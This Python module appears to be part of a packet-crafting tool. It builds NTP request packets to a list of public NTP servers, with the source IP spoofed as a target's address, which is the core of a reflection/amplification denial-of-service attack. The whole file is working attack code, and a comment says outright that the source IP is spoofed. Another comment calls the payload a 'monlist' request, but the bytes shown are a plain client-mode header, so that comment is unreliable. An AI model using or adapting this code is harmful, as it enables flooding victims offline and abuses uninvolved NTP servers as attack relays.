# own libs
from misc.globalfuncs import random_port, get_ip_from_dst, validate_ip_address, get_root_dir
from misc.pt_ip import create_ip_packet
from misc.pt_udp import create_udp_packet
# external libs
from json import load
from os.path import join


class NtpPacket:
    """NTP packet class containing all the necessary information to send a NTP packet"""
    def __init__(self, ntp_packet, ntp_server_ip, sport):
        self.ntp_packet = ntp_packet
        self.ntp_server_ip = ntp_server_ip
        self.sport = sport


def load_ntp_servers():
    """Load NTP servers from ntp_servers.json, check if they are valid and convert domain list to ip list"""
    with open(join(__file__.rsplit("/", 1)[0], "ntp_servers.json")) as f:
        data = load(f)
        ntp_servers = data['ntp_servers']
    ntp_servers_ip = []
    for ntp_server in ntp_servers:
        ntp_ip = get_ip_from_dst(ntp_server)
        if validate_ip_address(ntp_ip):
            ntp_servers_ip.append(ntp_ip)
    return ntp_servers_ip


def create_ntp_packet(ntp_server_ip, sport, src):
    """Create NTP packet and return it"""
    ntp_port = 123  # 123 is the NTP port
    ntp_data = "\x1b\x00\x00\x00"+"\x00"*11*4  # monlist packet, minimum size is 12*4 octets
    udp_packet = create_udp_packet(ntp_data, sport, ntp_port)
    ip_packet = create_ip_packet(src, ntp_server_ip, udp_packet)  # spoofed src ip as target's ip address
    return ip_packet.get_packet()


def create_ntp_packet_list(dst):
    """Create NTP packet list and return it"""
    ntp_packet_list = []
    ntp_servers_list = load_ntp_servers()
    for ntp_server in ntp_servers_list:
        sport = random_port()
        packet = create_ntp_packet(ntp_server, sport, dst)
        ntp_packet_list.append(NtpPacket(packet, ntp_server, sport))
    return ntp_packet_list
